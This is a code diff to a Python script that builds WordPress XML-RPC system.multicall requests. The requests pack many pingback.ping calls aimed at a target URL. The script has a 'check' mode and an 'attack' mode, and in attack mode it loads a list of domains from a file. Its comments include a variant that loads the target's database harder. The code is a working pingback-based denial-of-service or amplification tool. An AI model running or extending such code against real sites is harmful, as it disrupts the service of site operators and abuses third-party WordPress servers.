@@ -6,27 +6,30 @@ from urllib.parse import urlparse
 import sys, uuid, urllib3, requests
 urllib3.disable_warnings()
 
-domain_file = ""
-
 DEBUG = True 
 def dprint(X):
 	if DEBUG: print(X)
 
 COUNT=0
-def build_entry(pingback,target):
+def build_entry(pingback,target,domain_file):
 	entry  = "<value><struct><member><name>methodName</name><value>pingback.ping</value></member><member>"
-	entry += f"<name>params</name><value><array><data><value>http://{pingback}</value>"
+	if domain_file != "": entry += f"<name>params</name><value><array><data><value>http://{pingback}</value>"
+	else: entry += f"<name>params</name><value><array><data><value>{pingback}</value>"
 	#entry += f"<name>params</name><value><array><data><value>{pingback}/{uuid.uuid4()}</value>"
 	entry += f"<value>{target}/?p=1</value></data></array></value></member></struct></value>"
 	#entry += f"<value>{target}/#e</value></data></array></value></member></struct></value>" # taxes DB more
 	return entry
 
-def build_request(pingback,target,entries):
-	pingback = (open(pingback).read()).split("\n")
+def build_request(pingback,target,entries,domain_file):
 	prefix   = "<methodCall><methodName>system.multicall</methodName><params><param><array>"
 	suffix   = "</array></param></params></methodCall>"
 	request  = prefix
-	for _ in range(0,entries): request += build_entry(pingback[_],target)
+	if domain_file == "":
+		print(domain_file)
+		for _ in range(0,entries): request += build_entry(pingback,target,domain_file)
+	else:
+		pingback = (open(domain_file).read()).split("\n")
+		for _ in range(0,entries): request += build_entry(pingback[_],target,domain_file)
 	request += suffix
 	return request
 
@@ -62,10 +65,14 @@ def main(action,pingback,target):
 	if action == "check":    entries = 2
 	elif action == "attack": entries = len((open(pingback).read()).split("\n"))
 	print(f"[+] Running in {action} mode")
-	if action == "check": print(f"[+] Got pingback URL \"{pingback}\"")
+	domain_file = ""
+	if action == "check":
+		print(f"[+] Got pingback URL \"{pingback}\"")
+	else:
+		domain_file = pingback
 	print(f"[+] Got target URL \"{target}\"")
 	print(f"[+] Building {entries} pingback calls")
-	xmldata = build_request(pingback,target,entries)
+	xmldata = build_request(pingback, target, entries, domain_file)
 	dprint("[+] Request:\n")
 	dprint(xmldata+"\n")
 	print(f"[+] Request size: {len(xmldata)} bytes")
